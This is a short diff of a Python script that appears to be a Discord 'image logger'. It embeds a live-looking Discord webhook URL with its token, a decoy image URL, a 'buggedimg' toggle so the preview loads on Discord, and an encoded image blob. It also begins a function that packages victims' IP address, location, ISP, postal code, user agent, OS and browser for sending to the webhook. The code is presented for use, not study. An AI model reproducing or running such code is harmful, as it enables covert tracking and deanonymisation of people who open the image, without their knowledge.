@@ -4,8 +4,8 @@ import httpx, base64, httpagentparser
 
 webhook = 'https://discord.com/api/webhooks/1420639463838846996/FbGA1WqoMLKmF-x8Ah6uG84P8YBLPM97cAHKHwqRypEn6AkifOm2n6iKT7uNEHyTqbIe'
 
-bindata = httpx.get('https://pbs.twimg.com/profile_images/1284155869060571136/UpanAYid_400x400.jpg').content
-buggedimg = False # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
+bindata = httpx.get('https://imgs.search.brave.com/EMFTXSRkNngmNYQSHcGuEXq8eChlTe0zxZrpWU5kZhw/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly93d3cu/Z2dmLmx1L2ZpbGVh/ZG1pbi91c2VyX3Vw/bG9hZC9BYm91dF90/aGVfRnVuZF9JbXBh/Y3RfVEFfcGhvdG9z/L0Fib3V0X0luc3Rp/dHV0aW9uYWxfU3Ry/dWN0dXJlX2dyYXBo/aWNfRnVuZC5zdmc').content
+buggedimg = True # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
 buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
 
 def formatHook(ip,city,reg,country,loc,org,postal,useragent,os,browser):
